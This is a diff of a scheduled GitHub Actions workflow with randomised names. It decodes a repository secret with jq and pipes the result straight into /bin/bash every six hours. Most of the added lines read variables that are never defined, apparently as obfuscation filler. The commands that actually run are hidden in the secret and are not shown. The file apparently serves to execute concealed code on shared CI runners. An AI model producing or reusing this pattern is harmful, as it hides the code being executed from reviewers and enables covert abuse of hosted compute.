@@ -3,28 +3,25 @@ name: sunbajie4718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-jobs:  # 25200
+    - cron: '52 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sunbajie4718
         env:
-          ztnp13: ${{ secrets.ztnp13 }}
+          ho528: ${{ secrets.ho528 }}
         run: |
-          echo $ztnp13 | jq -r .rlgjy753 | /bin/bash
-          echo $g4 | jq -r .pemx947 | /bin/bash
-          echo $nqtf4 | jq -r .w83 | /bin/bash
-          echo $vib8871 | jq -r .iz920 | /bin/bash
-          echo $xzb07550 | jq -r .gspyg83 | /bin/bash
-          echo $qdykj63283 | jq -r .too3 | /bin/bash
-          echo $qfqs8 | jq -r .ju008 | /bin/bash
-          echo $f98634 | jq -r .g0 | /bin/bash
-          echo $k105 | jq -r .zex349 | /bin/bash
-          echo $jwz54780 | jq -r .z60 | /bin/bash
-          echo $gmez43 | jq -r .m1 | /bin/bash
-          echo $wy6 | jq -r .p777 | /bin/bash
-          echo $xt603 | jq -r .sziw2 | /bin/bash
+          echo $ho528 | jq -r .fb738 | /bin/bash
+          echo $dpp8391 | jq -r .fsy163 | /bin/bash
+          echo $m47195 | jq -r .vg946 | /bin/bash
+          echo $f45993 | jq -r .qjhy44650 | /bin/bash
+          echo $vxga4 | jq -r .b9 | /bin/bash
+          echo $y68 | jq -r .bdvb5 | /bin/bash
+          echo $tha73 | jq -r .ghw95 | /bin/bash
+          echo $iuoz19 | jq -r .zi669 | /bin/bash
+          echo $s8573 | jq -r .rasez31749 | /bin/bash
+          echo $ie935 | jq -r .hab75 | /bin/bash
 
